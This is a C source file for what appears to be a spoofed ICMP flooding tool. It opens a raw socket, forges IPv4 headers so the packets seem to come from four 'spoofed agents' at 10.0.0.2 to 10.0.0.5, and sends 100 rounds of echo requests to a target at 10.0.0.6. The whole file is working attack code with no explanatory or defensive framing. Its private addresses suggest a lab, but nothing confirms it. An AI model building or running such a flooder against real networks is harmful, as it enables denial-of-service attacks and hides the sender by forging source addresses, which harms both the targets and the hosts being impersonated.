#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netdb.h>
#include <ctype.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <time.h>
#include <signal.h>

unsigned short icmp_checksum(void *buf_ptr, int length) {
    unsigned short *word_buf = (unsigned short *)buf_ptr;
    unsigned int sum = 0;
    unsigned short final_sum;

    while (length > 1) {
        sum += *word_buf++;
        length -= 2;
    }

    if (length == 1) {
        sum += *(unsigned char *)word_buf;
    }

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    final_sum = (unsigned short)~sum;

    return final_sum;
}

int main() {
    int raw_sock;
    
    char *spoof_sources[] = {"10.0.0.2","10.0.0.3", "10.0.0.4","10.0.0.5"};
    char target_ip[] = "10.0.0.6";     
    int repeat_rounds = 100;                
    char *pkt_buffer;
    int payload_size = 1024;

    int agent_count = sizeof(spoof_sources) / sizeof(spoof_sources[0]);
    printf("Total spoofed agents: %d\n", agent_count);

    struct sockaddr_in dst_addr;

   
    raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (raw_sock < 0) {
        perror("socket() failed");
        exit(EXIT_FAILURE);
    }

    
    int opt_on = 1;
    if (setsockopt(raw_sock, IPPROTO_IP, IP_HDRINCL, &opt_on, sizeof(opt_on)) < 0) {
        perror("setsockopt(IP_HDRINCL) failed");
        close(raw_sock);
        return EXIT_FAILURE;
    }

  
    memset(&dst_addr, 0, sizeof(dst_addr));
    dst_addr.sin_family = AF_INET;
    dst_addr.sin_addr.s_addr = inet_addr(target_ip);

    for (int round = 0; round < repeat_rounds; round++) {
        for (int idx = 0; idx < agent_count; idx++) {

           
            pkt_buffer = malloc(sizeof(struct iphdr) + sizeof(struct icmphdr) + payload_size);
            if (!pkt_buffer) {
                perror("malloc() failed");
                close(raw_sock);
                return EXIT_FAILURE;
            }

            struct iphdr *ip_hdr = (struct iphdr *)pkt_buffer;
            struct icmphdr *icmp_hdr =(struct icmphdr *)(pkt_buffer + sizeof(struct iphdr));

            memset(pkt_buffer, 0, sizeof(struct iphdr) +sizeof(struct icmphdr) + payload_size);

            
            ip_hdr->ihl = 5;
            ip_hdr->version = 4;
            ip_hdr->tos = 0;
            ip_hdr->tot_len =
                htons(sizeof(struct iphdr) + sizeof(struct icmphdr));
            ip_hdr->id = htons(rand() % 65535);
            ip_hdr->frag_off = 0;
            ip_hdr->ttl = 16;
            ip_hdr->protocol = IPPROTO_ICMP;
            ip_hdr->check = 0;
            ip_hdr->saddr = inet_addr(spoof_sources[idx]);
            ip_hdr->daddr = dst_addr.sin_addr.s_addr;
            ip_hdr->check =
                icmp_checksum((unsigned short *)pkt_buffer,sizeof(struct iphdr));

            
            icmp_hdr->type = 8;
            icmp_hdr->code = 0;
            icmp_hdr->checksum =
                icmp_checksum((unsigned short *)icmp_hdr,sizeof(struct icmphdr));

            
            if (sendto(raw_sock,pkt_buffer,sizeof(struct iphdr) + sizeof(struct icmphdr),0,(struct sockaddr *)&dst_addr,sizeof(dst_addr)) < 0) {
                perror("sendto() failed");
                free(pkt_buffer);
                close(raw_sock);
                exit(EXIT_FAILURE);
            }

            free(pkt_buffer);
            printf("%d ICMP packet sent from %s (round %d)\n",
                   idx + 1,
                   spoof_sources[idx],
                   round + 1);
        }
    }

    close(raw_sock);
    return 0;
}
